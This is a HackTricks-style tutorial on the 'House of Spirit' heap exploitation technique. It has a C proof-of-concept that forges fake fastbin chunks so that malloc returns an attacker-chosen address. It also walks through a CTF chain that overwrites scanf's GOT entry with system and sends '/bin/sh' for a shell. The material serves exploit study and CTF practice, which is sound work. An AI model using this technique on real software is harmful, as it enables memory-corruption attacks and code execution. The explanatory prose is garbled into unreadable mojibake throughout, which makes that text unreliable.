# House of Spirit

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

рджреВрд╕рд░реЗ рддрд░реАрдХреЗ HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рди**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ**](https://peass.creator-spring.com)
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **Twitter** рдкрд░ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗред

</details>

## Basic Information

### Code

<details>

<summary>House of Spirit</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Code altered to add som prints from: https://heap-exploitation.dhavalkapil.com/attacks/house_of_spirit

struct fast_chunk {
size_t prev_size;
size_t size;
struct fast_chunk *fd;
struct fast_chunk *bk;
char buf[0x20];               // chunk falls in fastbin size range
};

int main() {
struct fast_chunk fake_chunks[2];   // Two chunks in consecutive memory
void *ptr, *victim;

ptr = malloc(0x30);

printf("Original alloc address: %p\n", ptr);
printf("Main fake chunk:%p\n", &fake_chunks[0]);
printf("Second fake chunk for size: %p\n", &fake_chunks[1]);

// Passes size check of "free(): invalid size"
fake_chunks[0].size = sizeof(struct fast_chunk);

// Passes "free(): invalid next size (fast)"
fake_chunks[1].size = sizeof(struct fast_chunk);

// Attacker overwrites a pointer that is about to be 'freed'
// Point to .fd as it's the start of the content of the chunk
ptr = (void *)&fake_chunks[0].fd;

free(ptr);

victim = malloc(0x30);
printf("Victim: %p\n", victim);

return 0;
}
```
</details>

### рд▓рдХреНрд╖реНрдп

* рдПрдХ рдкрддрд╛ рддрдп рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдЬреЛ рдмрд╛рдж рдореЗрдВ рдЗрд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╕рдВрднрд╡ рд╣реЛ

### рдЖрд╡рд╢реНрдпрдХрддрд╛рдПрдВ

* рдЗрд╕ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдХреБрдЫ рдирдХрд▓реА рддреНрд╡рд░рд┐рдд рдЯреБрдХрдбрд╝реЗ рдмрдирд╛ рд╕рдХрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ рдЬреЛ рд╕рд╣реА рд░реВрдк рд╕реЗ рдЙрд╕рдХреЗ рдЖрдХрд╛рд░ рдорд╛рди рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ рдкрд╣рд▓реЗ рдирдХрд▓реА рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рд╣реЛ рддрд╛рдХрд┐ рдпрд╣ рдмрд┐рди рдореЗрдВ рдкрд╣реБрдВрдЪ рдЬрд╛рдПред

### рд╣рдорд▓рд╛

* рд╕реБрд░рдХреНрд╖рд╛ рдЬрд╛рдВрдЪреЛрдВ рдХреЛ рдЫрд▓рдиреЗ рд╡рд╛рд▓реЗ рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдмрдирд╛рдПрдВ: рдЖрдкрдХреЛ рдореБрдЦреНрдп рд░реВрдк рд╕реЗ рд╕рд╣реА рд╕реНрдерд╛рдиреЛрдВ рдкрд░ рд╕рд╣реА рдЖрдХрд╛рд░ рджрд┐рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ 2 рдирдХрд▓реА рдЯреБрдХрдбрд╝реЗ рдЪрд╛рд╣рд┐рдП
* рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдкрд╣рд▓реЗ рдирдХрд▓реА рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреА рдкреНрд░рдмрдВрдзрди рдХрд░реЗрдВ рддрд╛рдХрд┐ рдпрд╣ рддреЗрдЬ рдпрд╛ рдЯреАрдХреИрд╢ рдмрд┐рди рдореЗрдВ рдкрд╣реБрдВрдЪ рдЬрд╛рдП рдФрд░ рдлрд┐рд░ рдЗрд╕реЗ рдЙрд╕ рдкрддреЗ рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рдВрдЯрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ

**рдХреЛрдб рд╕реЗ** [**guyinatuxedo**](https://guyinatuxedo.github.io/39-house\_of\_spirit/house\_spirit\_exp/index.html) **рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ рд╕рдордЭрдиреЗ рдХреЗ рд▓рд┐рдП рдмрдбрд╝рд╛ рдЕрдЪреНрдЫрд╛ рд╣реИред** рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕ рдХреЛрдб рд╕реЗ рдпрд╣ рдЦрд╛рдХрд╛ рдЗрд╕реЗ рдЕрдЪреНрдЫреА рддрд░рд╣ рд╕реЗ рд╕рд╛рд░рд╛рдВрд╢рд┐рдд рдХрд░рддрд╛ рд╣реИ:
```c
/*
this will be the structure of our two fake chunks:
assuming that you compiled it for x64

+-------+---------------------+------+
| 0x00: | Chunk # 0 prev size | 0x00 |
+-------+---------------------+------+
| 0x08: | Chunk # 0 size      | 0x60 |
+-------+---------------------+------+
| 0x10: | Chunk # 0 content   | 0x00 |
+-------+---------------------+------+
| 0x60: | Chunk # 1 prev size | 0x00 |
+-------+---------------------+------+
| 0x68: | Chunk # 1 size      | 0x40 |
+-------+---------------------+------+
| 0x70: | Chunk # 1 content   | 0x00 |
+-------+---------------------+------+

for what we are doing the prev size values don't matter too much
the important thing is the size values of the heap headers for our fake chunks
*/
```
{% hint style="info" %}
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ рдХреБрдЫ рд╕реЗрдиреНрдЯреА рдЪреЗрдХреНрд╕ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд╕рд░реЗ рдЪрдВрдХ рдХреЛ рдмрдирд╛рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИред
{% endhint %}

## рдЙрджрд╛рд╣рд░рдг

* CTF [https://guyinatuxedo.github.io/39-house\_of\_spirit/hacklu14\_oreo/index.html](https://guyinatuxedo.github.io/39-house\_of\_spirit/hacklu14\_oreo/index.html)
* **Libc infoleak**: рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдмрджрд▓рдХрд░ рдПрдХ GOT рдкрддрд╛ рдкрд░ рдкрд╣реБрдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ CTF рдХреЗ read рдХреНрд░рд┐рдпрд╛ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХ libc рдкрддрд╛ рд▓реАрдХ рд╣реЛ рд╕рдХреЗ
* **House of Spirit**: "рд░рд╛рдЗрдлрд▓" рдХреА рд╕рдВрдЦреНрдпрд╛ рдХреЛ рдЧрд┐рдирдиреЗ рд╡рд╛рд▓реЗ рдПрдХ рдХрд╛рдЙрдВрдЯрд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣рд▓реЗ рдирдХрд▓реА рдЪрдВрдХ рдХрд╛ рдПрдХ рдирдХрд▓реА рдЖрдХрд╛рд░ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдлрд┐рд░ "рд╕рдВрджреЗрд╢" рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЪрдВрдХ рдХреЗ рджреВрд╕рд░реЗ рдЖрдХрд╛рд░ рдХреЛ рдирдХрд▓реА рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдЕрдВрддрддрдГ рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдкреЙрдЗрдВрдЯрд░ рдХреЛ рдмрджрд▓рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдореБрдХреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рддрд╛рдХрд┐ рд╣рдорд╛рд░рд╛ рдкрд╣рд▓рд╛ рдирдХрд▓реА рдЪрдВрдХ рдореБрдХреНрдд рд╣реЛ рдЬрд╛рдПред рдлрд┐рд░, рд╣рдо рдЗрд╕реЗ рдЖрд╡рдВрдЯрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕рдХреЗ рдЕрдВрджрд░ "рд╕рдВрджреЗрд╢" рдХреЛ рдХрд╣рд╛рдВ рд╕реНрдЯреЛрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд╡рд╣рд╛рдВ рд╣реЛрдЧрд╛ред рдлрд┐рд░, рдЗрд╕реЗ `scanf` рдкреНрд░рд╡рд┐рд╖реНрдЯрд┐ рдХреЗ рдЕрдВрджрд░ рдкрд╣реБрдВрдЪрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛрдХрд┐ GOT рддрд╛рд▓рд┐рдХрд╛ рдХреЗ рдЕрдВрджрд░ рд╣реИ, рддрд╛рдХрд┐ рд╣рдо рдЗрд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкрддреЗ рдХреЗ рд╕рд╛рде рдЕрдзрд┐рд░реЛрдкрд┐рдд рдХрд░ рд╕рдХреЗрдВред\
рдЕрдЧрд▓реА рдмрд╛рд░ `scanf` рдХреЛ рдХреЙрд▓ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рд╣рдо рдЗрдирдкреБрдЯ `"/bin/sh"` рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдПрдХ рд╢реИрд▓ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИред

## рд╕рдВрджрд░реНрдн

* [https://heap-exploitation.dhavalkapil.com/attacks/house\_of\_spirit](https://heap-exploitation.dhavalkapil.com/attacks/house\_of\_spirit)

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ **HackTricks** рдореЗрдВ рдпрд╛ **HackTricks** рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░** **рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдФрд░ рд╣реИрдХрдЯреНрд░рд┐рдХреНрд╕ рдХреНрд▓рд╛рдЙрдб рдЧрд┐рдЯрд╣рдм рд░реЗрдкреЛ рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗред

</details>
